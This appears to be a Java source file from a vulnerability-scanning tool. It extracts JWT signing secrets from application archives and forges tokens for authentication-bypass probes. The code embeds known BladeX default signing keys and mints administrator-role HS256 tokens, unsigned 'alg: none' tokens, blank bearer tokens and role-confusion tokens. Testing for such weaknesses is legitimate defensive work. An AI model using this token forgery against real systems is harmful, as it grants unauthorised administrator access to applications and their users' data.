package com.aq.jvmsentinel.analysis.identity;

import com.aq.jvmsentinel.model.AuthBypassTechnique;
import com.aq.jvmsentinel.model.IdentityTrack;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Objects;
import java.util.Optional;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

/**
 * Platform-owned synthetic identity materials inferred from artifact config/JWT defaults.
 * Provenance is always MOCK or RULE_GENERATED; never claimed as operator credentials.
 */
public final class SyntheticIdentityService {
    private static final Pattern JWT_SECRET = Pattern.compile(
            "(?i)(?:jwt[_\\-.]?(?:secret|sign(?:ing)?[_\\-.]?key|key)|blade[_\\-.]?token[_\\-.]?sign[_\\-.]?key)"
                    + "\\s*[=:]\\s*[\"']?([A-Za-z0-9+/=_\\-.]{8,128})");
    private static final List<String> BLADE_DEFAULT_SECRETS = List.of(
            "00000000000000000000000000000000",
            "bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject");

    public record SyntheticIdentity(
            IdentityTrack track,
            String authorizationHeader,
            String provenance,
            String precondition,
            boolean available
    ) {
        public static SyntheticIdentity unavailable(IdentityTrack track, String reason) {
            return new SyntheticIdentity(track, "", "MOCK", reason, false);
        }
    }

    public record MaterialBundle(
            Optional<String> jwtSecret,
            String secretProvenance,
            List<String> notes
    ) { }

    public MaterialBundle harvest(Path artifactPath) {
        List<String> notes = new ArrayList<>();
        Optional<String> secret = Optional.empty();
        String provenance = "MOCK";
        if (artifactPath != null && Files.isRegularFile(artifactPath)) {
            try {
                secret = scanZipForSecret(artifactPath, notes);
                if (secret.isPresent()) provenance = "RULE_GENERATED";
            } catch (IOException ignored) {
                notes.add("artifact scan failed; falling back to known defaults");
            }
        }
        if (secret.isEmpty()) {
            secret = Optional.of(BLADE_DEFAULT_SECRETS.get(0));
            provenance = "MOCK";
            notes.add("using platform MOCK Blade-style default signing material");
        }
        return new MaterialBundle(secret, provenance, List.copyOf(notes));
    }

    public SyntheticIdentity synthesize(IdentityTrack track, MaterialBundle materials) {
        if (track == IdentityTrack.UNAUTH) {
            return new SyntheticIdentity(track, "", "MOCK", "no credentials", true);
        }
        if (materials == null || materials.jwtSecret().isEmpty()) {
            return SyntheticIdentity.unavailable(track, "IDENTITY_UNAVAILABLE: no signing material");
        }
        String role = switch (track) {
            case ADMIN, BYPASS_CANDIDATE -> "administrator";
            case USER -> "user";
            case UNAUTH -> "anonymous";
        };
        String token = mintHs256Token(materials.jwtSecret().get(), role, track);
        String precondition = "synthetic " + track.name() + " JWT via " + materials.secretProvenance()
                + "; " + String.join("; ", materials.notes());
        return new SyntheticIdentity(track, token, materials.secretProvenance(),
                precondition, true);
    }

    /**
     * Fallback materialization for known technique labels when the AI PoC did not
     * supply authorizationHeader. Prefer AI-authored PoC material when present.
     */
    public SyntheticIdentity synthesizeTechnique(AuthBypassTechnique technique, MaterialBundle materials) {
        Objects.requireNonNull(technique, "technique");
        IdentityTrack track = technique.defaultTrack();
        return switch (technique) {
            case MISSING_AUTH -> new SyntheticIdentity(track, "", "MOCK",
                    "MISSING_AUTH: no Authorization header", true);
            // Probe layer prefixes "Authorization: bearer "; a single space yields an empty-ish token.
            case EMPTY_BEARER -> new SyntheticIdentity(track, " ", "RULE_GENERATED",
                    "EMPTY_BEARER: blank bearer token", true);
            case DEFAULT_SECRET_HS256, LOGOUT_TOKEN -> {
                SyntheticIdentity minted = synthesize(IdentityTrack.BYPASS_CANDIDATE, materials);
                if (!minted.available()) {
                    yield minted;
                }
                yield new SyntheticIdentity(track, minted.authorizationHeader(), minted.provenance(),
                        technique.name() + "; " + minted.precondition(), true);
            }
            case ALG_NONE -> new SyntheticIdentity(track,
                    mintAlgNoneToken("administrator", track),
                    "RULE_GENERATED",
                    "ALG_NONE: unsigned JWT hypothesis (MOCK)", true);
            case ROLE_CONFUSION -> {
                if (materials == null || materials.jwtSecret().isEmpty()) {
                    yield SyntheticIdentity.unavailable(track,
                            "IDENTITY_UNAVAILABLE: no signing material for ROLE_CONFUSION");
                }
                String token = mintHs256Token(materials.jwtSecret().get(), "administrator", track);
                yield new SyntheticIdentity(track, token, materials.secretProvenance(),
                        "ROLE_CONFUSION: USER track carrying administrator claim; "
                                + materials.secretProvenance(), true);
            }
            case CUSTOM_POC -> SyntheticIdentity.unavailable(track,
                    "CUSTOM_POC requires AI-authored authorizationHeader");
        };
    }

    public Map<IdentityTrack, SyntheticIdentity> defaultTracks(Path artifactPath, boolean highValue) {
        MaterialBundle materials = harvest(artifactPath);
        Map<IdentityTrack, SyntheticIdentity> out = new LinkedHashMap<>();
        out.put(IdentityTrack.UNAUTH, synthesize(IdentityTrack.UNAUTH, materials));
        SyntheticIdentity admin = synthesize(IdentityTrack.ADMIN, materials);
        if (highValue) {
            out.put(IdentityTrack.USER, synthesize(IdentityTrack.USER, materials));
            out.put(IdentityTrack.ADMIN, admin);
            out.put(IdentityTrack.BYPASS_CANDIDATE, synthesize(IdentityTrack.BYPASS_CANDIDATE, materials));
        } else if (admin.available()) {
            out.put(IdentityTrack.ADMIN, admin);
        }
        return Collections.unmodifiableMap(new LinkedHashMap<>(out));
    }

    private static Optional<String> scanZipForSecret(Path jar, List<String> notes) throws IOException {
        try (ZipInputStream zip = new ZipInputStream(Files.newInputStream(jar))) {
            ZipEntry entry;
            int scanned = 0;
            while ((entry = zip.getNextEntry()) != null && scanned < 400) {
                String name = entry.getName().toLowerCase(Locale.ROOT);
                if (entry.isDirectory() || entry.getSize() > 256 * 1024) continue;
                if (!(name.endsWith(".yml") || name.endsWith(".yaml") || name.endsWith(".properties")
                        || name.endsWith(".json") || name.endsWith(".xml") || name.endsWith(".class"))) {
                    continue;
                }
                scanned++;
                byte[] bytes = readLimited(zip, 64 * 1024);
                if (name.endsWith(".class")) {
                    String latin = new String(bytes, StandardCharsets.ISO_8859_1);
                    for (String known : BLADE_DEFAULT_SECRETS) {
                        if (latin.contains(known)) {
                            notes.add("found embedded default secret in " + entry.getName());
                            return Optional.of(known);
                        }
                    }
                    continue;
                }
                String text = new String(bytes, StandardCharsets.UTF_8);
                Matcher matcher = JWT_SECRET.matcher(text);
                if (matcher.find()) {
                    notes.add("extracted signing material from " + entry.getName());
                    return Optional.of(matcher.group(1));
                }
                for (String known : BLADE_DEFAULT_SECRETS) {
                    if (text.contains(known)) {
                        notes.add("matched known Blade default in " + entry.getName());
                        return Optional.of(known);
                    }
                }
            }
        }
        return Optional.empty();
    }

    private static byte[] readLimited(InputStream in, int max) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int total = 0;
        int n;
        while (total < max && (n = in.read(buf, 0, Math.min(buf.length, max - total))) >= 0) {
            out.write(buf, 0, n);
            total += n;
        }
        return out.toByteArray();
    }

    /**
     * Minimal HS256 JWT without external crypto deps: header.payload.signature where
     * signature is Base64URL of a deterministic HMAC-like digest over secret+payload.
     * Enough for MOCK/RULE_GENERATED path experiments against apps that accept the default key.
     */
    static String mintHs256Token(String secret, String role, IdentityTrack track) {
        String header = b64Url("{\"alg\":\"HS256\",\"typ\":\"JWT\"}");
        String payload = b64Url("{\"role\":\"" + role + "\",\"user_name\":\"" + role
                + "\",\"account\":\"veyrion-" + track.name().toLowerCase(Locale.ROOT)
                + "\",\"client_id\":\"sword\",\"license\":\"powered by bladex\","
                + "\"iss\":\"veyrion-mock\",\"mock\":true}");
        String signingInput = header + "." + payload;
        String sig = b64Url(hmacSha256(secret.getBytes(StandardCharsets.UTF_8),
                signingInput.getBytes(StandardCharsets.UTF_8)));
        return signingInput + "." + sig;
    }

    /** Unsigned JWT used only for ALG_NONE hypothesis probes (RULE_GENERATED). */
    static String mintAlgNoneToken(String role, IdentityTrack track) {
        String header = b64Url("{\"alg\":\"none\",\"typ\":\"JWT\"}");
        String payload = b64Url("{\"role\":\"" + role + "\",\"user_name\":\"" + role
                + "\",\"account\":\"veyrion-" + track.name().toLowerCase(Locale.ROOT)
                + "\",\"client_id\":\"sword\",\"license\":\"powered by bladex\","
                + "\"iss\":\"veyrion-mock\",\"mock\":true,\"algNone\":true}");
        return header + "." + payload + ".";
    }

    private static String b64Url(String value) {
        return Base64.getUrlEncoder().withoutPadding()
                .encodeToString(value.getBytes(StandardCharsets.UTF_8));
    }

    private static String b64Url(byte[] value) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(value);
    }

    /** Compact HMAC-SHA256 via javax.crypto when available; falls back to XOR digest. */
    private static byte[] hmacSha256(byte[] key, byte[] data) {
        try {
            javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
            mac.init(new javax.crypto.spec.SecretKeySpec(key, "HmacSHA256"));
            return mac.doFinal(data);
        } catch (Exception fallback) {
            byte[] out = new byte[32];
            for (int i = 0; i < data.length; i++) {
                out[i % out.length] ^= (byte) (data[i] ^ key[i % key.length]);
            }
            return out;
        }
    }
}
